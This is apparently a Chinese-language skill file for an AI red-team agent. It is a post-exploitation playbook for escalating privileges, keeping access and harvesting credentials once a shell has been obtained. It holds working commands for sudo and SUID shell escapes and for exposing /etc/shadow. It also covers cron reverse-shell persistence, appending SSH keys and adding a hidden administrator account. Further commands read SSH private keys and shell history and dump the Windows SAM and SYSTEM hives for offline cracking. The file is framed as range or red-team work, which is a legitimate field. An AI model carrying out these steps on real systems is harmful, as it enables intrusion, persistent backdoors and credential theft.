---
name: privesc-persistence
description: 拿到 shell 后站稳三件套：权限鉴定与提权枚举（Linux SUID/capabilities/计划任务/内核、Windows 服务/UAC/令牌）、权限维持（计划任务/服务/SSH key/注册表/内存马）、凭据收割（哈希/密钥/配置/浏览器与内存提取）
whenToUse: 漏洞利用拿到命令执行/WebShell 之后立刻用；隧道或马被踢、重启后入口消失说明没做维持；内网横向前需要先在本机榨干凭据
role: exploit
enabled: true
---

# 提权 + 权限维持 + 凭据收割（拿到 shell 先站稳）

**一次性 `?cmd=` 不是战果，站得住的 shell 才是。** 拿到最低权限执行点后，按固定三问走：
1. **能不能提权**（本机从 www-data/SYSTEM 以下爬到 root/SYSTEM/域）；
2. **能不能维持**（重启、杀进程、清理临时文件后入口还在不在）；
3. **能不能收割**（这台机器上的哈希、密钥、配置、历史命令、浏览器凭据——它们是下一台资产的门票）。
三问没做完就去打下一个目标，等于给靶场打工。

## 第一问：提权

### Linux（技能口径：先枚举再打，不赌单一 CVE）

```bash
# 0) 我是谁、能干什么
id; sudo -l 2>/dev/null; cat /etc/os-release; uname -r
getcap -r / 2>/dev/null | grep -v proc          # capabilities 直接出可利用二进制

# 1) 自动化枚举（本机有就跑，没有就手工过 2-5）
find / -perm -4000 -type f 2>/dev/null | grep -v proc   # SUID 清单
ls -la /etc/cron* /var/spool/cron 2>/dev/null           # 计划任务可读可写？
ps auxww | grep -i root | grep -v grep                  # root 进程命令行泄密
find / -writable -type f 2>/dev/null | grep -v proc | head -30   # 可写敏感文件

# 2) 高频提权路径（按命中率排序）
sudo <bin> -s /bin/sh            # sudo -l 里 NOPASSWD 的任意门（gtfobins 全表）
awk 'BEGIN{system("/bin/bash")}' # SUID awk/find/python/vim 等 gtfobins 家族
cp /etc/shadow /tmp/ && chmod 644 /tmp/shadow   # shadow 可读 → 离线破解 root 哈希
```

- **内核 CVE 是最后手段**（编译 exp 会炸 EDR/蓝屏），先穷尽配置类（SUID/sudo/cron/cap）。
- 判定成功标准：`id` 回显 uid=0，**不是**"命令跑了没报错"。

### Windows

```bat
whoami /priv          ; SeImpersonatePrivilege = 烂土豆家族直接可用（juicy-potato 族）
sc query type= service state= all | findstr -i "RUN_AS\|LocalSystem"  ; 服务权限配置
whoami /groups | findstr /i "Mandatory"    ; Medium IL + admin = UAC 可绕
```

- 有 `SeImpersonatePrivilege`（IIS/AppPool 常见）→ potato 系列提权（工具落 VPS 载荷目录分发）。
- 服务路径可写 / unquoted path → 重启服务即 SYSTEM。
- 判定成功标准：`whoami` 回显 `nt authority\system`。

## 第二问：权限维持（按入口类型选）

| 入口类型 | 维持手段 | 要点 |
| --- | --- | --- |
| WebShell（冰蝎/哥斯拉） | 马本身即维持 | **确认马文件不在临时目录**、重启 Web 服务仍在；多放 1-2 个不同后缀/路径备份马 |
| 命令执行（无马） | Linux：cron 反弹 / SSH authorized_keys 追加；Windows：计划任务 `schtasks /create` / 服务 | 载荷指向 VPS 回连（vps-reverse-shell），**别用一次性 nc** |
| 高权限 | Windows：新建隐藏本地管理员账号（`net user backdoor P@ss /add && net localgroup administrators backdoor /add`）；Linux：`/etc/passwd` 追加 uid=0 用户 | 账号名贴近业务命名，别叫 test/hack |
| 内存马（Tomcat/Spring） | 本身无文件、重启即失 | 必须**同时落一个文件马**做保险，内存马只作隐蔽主入口 |
| 容器内 root | 逃逸后在宿主机做维持 | 容器重建 = 一切归零，维持必须落在宿主机 |

**验收动作**：维持做完后，主动断开当前会话，**用维持入口重新连一次**——连不上等于没做。

## 第三问：凭据收割（本机榨干再走）

```bash
# Linux
cat ~/.bash_history | grep -iE "pass|pwd|ssh|mysql" | head -20
find / -name "*.conf" -o -name ".env" -o -name "wp-config.php" 2>/dev/null | head   # 配置泄露
ls ~/.ssh/; cat ~/.ssh/id_rsa 2>/dev/null                                            # SSH 私钥
# Windows
cmdkey /list                     # 存着的域凭据
reg save HKLM\SAM runs\SAM.hive && reg save HKLM\SYSTEM runs\SYSTEM.hive   # 离线提哈希
```

- 哈希 → 交 `credential-attack` 离线破解（hashcat），或直接 PtH 进 `lateral-movement`。
- 配置里的数据库连接串、内部 API token、内网 URL —— **全部进 `redteam_credential_add`**（`source=config-leak|shell-history`）。
- 收割到的内网地址（连接串里的 IP、hosts、known_hosts）**回报指挥并入资产库**——这是发现新网段的主通道之一。

## 失败分支

- **提权全失败**：不硬磨——当前权限能读的配置/凭据先榨干，凭据横扫别的资产（这台打不进下一台可能直接 SYSTEM）。
- **维持被清**（重启/运维杀）：说明对面有监控，改**双入口**（文件马 + 计划任务回连错开时间）；被杀事件本身记进 `redteam_asset_test`（有 EDR 这个信息值钱）。
- **容器里拿到 root**：先判能不能逃逸（`docker.sock` 挂载、privileged、内核版本），逃不了就把容器当跳板走隧道，别把容器 root 当服务器权限记分。

## 结果落库（必须做）

- 提权成功：`redteam_access_add` 更新权限档（`privilege=root|system`）+ `redteam_score_hit`（`server-host` 按档位）。
- 每个维持入口：`redteam_webshell_add` / `redteam_attack_file_add` 登记，note 写"重连验证通过"。
- 每条凭据/密钥/连接串：`redteam_credential_add`（写清来源文件路径）。
- 关键动作进 `redteam_chain_add`（`stage_code=internet|internal` 按所在侧），`tool` 写实际命令。

## 纪律

- 写操作（加账号、改 cron、装服务）**先记原值再改**，报告里要能回滚。
- 生产机避免编译型内核 exp；优先配置类、无文件类手段。
- 收割的凭据**先验证再用**（netexec-scan 一把梭验证），别拿死凭据横向撞墙。
